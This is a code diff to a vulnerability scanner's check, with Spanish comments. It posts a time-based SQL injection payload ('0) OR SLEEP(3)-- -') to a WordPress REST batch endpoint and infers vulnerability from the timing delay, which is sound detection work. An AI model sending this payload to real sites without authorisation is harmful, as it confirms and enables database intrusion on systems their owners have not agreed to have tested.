@@ -453,70 +453,96 @@ async function behavioralCheck(
   baseUrl: string,
   fetchFn: SafeFetch
 ): Promise<{ vulnerable: boolean | null; signal: string }> {
-  const batchUrl = `${baseUrl}/?rest_route=/batch/v1/`;
+  // Probar ambas rutas: rest_route (usada por el checker oficial) y wp-json
+  const batchUrls = [
+    `${baseUrl}/?rest_route=/batch/v1/`,
+    `${baseUrl}/wp-json/batch/v1`,
+  ];
+
+  // Descubrir qué ruta acepta el payload anidado
+  let workingUrl: string | null = null;
+  const probeBody = JSON.stringify(buildNestedBatchPayload("SLEEP(0)"));
+  for (const url of batchUrls) {
+    try {
+      await fetchFn(url, { method: "POST", body: probeBody });
+      workingUrl = url;
+      break;
+    } catch {
+      continue;
+    }
+  }
+
+  if (!workingUrl) {
+    // El WAF puede bloquear el payload anidado pero permitir el probe simple.
+    // Verificar si el probe simple funciona → el WAF bloquea el exploit → safe.
+    for (const url of batchUrls) {
+      try {
+        const { status } = await fetchFn(url, { method: "POST" });
+        if (status === 403 || status === 401) {
+          return {
+            vulnerable: false,
+            signal: `Prueba conductual: el WAF bloqueó el payload de prueba en ${url} (HTTP ${status}). El endpoint batch no es explotable desde esta red.`,
+          };
+        }
+      } catch {
+        continue;
+      }
+    }
+    return {
+      vulnerable: null,
+      signal:
+        "Prueba conductual no disponible: ninguna de las rutas batch aceptó las peticiones. Posible WAF o timeout de red bloqueando el escaneo.",
+    };
+  }
 
   const takeSample = async (sleepSec: number): Promise<number | null> => {
     const value = `0) OR SLEEP(${sleepSec})-- -`;
     const body = JSON.stringify(buildNestedBatchPayload(value));
     const t0 = Date.now();
     try {
-      await fetchFn(batchUrl, { method: "POST", body });
+      await fetchFn(workingUrl!, { method: "POST", body });
       return Date.now() - t0;
     } catch {
       return null;
     }
   };
 
-  // Warm-up
+  // Warm-up de conexión (absorbe overhead TLS/DNS, no cuenta para el delta)
   await takeSample(0);
 
-  // Baseline: 2 muestras SLEEP(0)
-  const baseline: number[] = [];
-  for (let i = 0; i < 3; i++) {
-    const t = await takeSample(0);
-    if (t !== null) baseline.push(t);
-    if (baseline.length >= 2) break;
-  }
-
-  if (baseline.length < 2) {
+  // 1 muestra baseline SLEEP(0) + 1 muestra inyectada SLEEP(3)
+  // Reducido a 1+1 para caber dentro del timeout de 30s de Vercel
+  const tBase = await takeSample(0);
+  if (tBase === null) {
     return {
       vulnerable: null,
       signal:
-        "Prueba conductual (SLEEP oracle) no pudo completarse: las peticiones de referencia fallaron.",
+        "Prueba conductual no disponible: la petición de referencia (SLEEP 0) falló. Posible WAF o timeout de red.",
     };
   }
 
-  // Test: 2 muestras SLEEP(3)
-  const test: number[] = [];
-  for (let i = 0; i < 3; i++) {
-    const t = await takeSample(3);
-    if (t !== null) test.push(t);
-    if (test.length >= 2) break;
-  }
-
-  if (test.length < 2) {
+  const tInjected = await takeSample(3);
+  if (tInjected === null) {
     return {
       vulnerable: null,
       signal:
-        "Prueba conductual (SLEEP oracle) no pudo completarse: las peticiones de inyección fallaron.",
+        "Prueba conductual no disponible: la petición de inyección (SLEEP 3) falló. Posible WAF o timeout de red.",
     };
   }
 
-  const baseMedian = median(baseline) / 1000;
-  const testMedian = median(test) / 1000;
-  const delta = testMedian - baseMedian;
+  const delta = (tInjected - tBase) / 1000;
   const threshold = 2.0;
 
   if (delta >= threshold) {
     return {
       vulnerable: true,
-      signal: `Prueba conductual POSITIVA: SLEEP(3) tardó ${testMedian.toFixed(1)}s vs ${baseMedian.toFixed(1)}s de referencia (Δ=${delta.toFixed(1)}s, umbral ${threshold}s). El sitio ES vulnerable a la inyección SQL.`,
+      signal: `Prueba conductual POSITIVA: SLEEP(3) tardó ${(tInjected / 1000).toFixed(1)}s vs ${(tBase / 1000).toFixed(1)}s de referencia (Δ=${delta.toFixed(1)}s, umbral ${threshold}s). El sitio ES vulnerable.`,
     };
   }
 
   return {
     vulnerable: false,
-    signal: `Prueba conductual negativa: sin diferencia de tiempo significativa (Δ=${delta.toFixed(1)}s, umbral ${threshold}s). El sitio parece estar parcheado o no es vulnerable.`,
+    signal: `Prueba conductual negativa: sin diferencia de tiempo significativa (SLEEP 3 → ${(tInjected / 1000).toFixed(1)}s, ref → ${(tBase / 1000).toFixed(1)}s, Δ=${delta.toFixed(1)}s). El sitio parece estar parcheado.`,
   };
 }
 
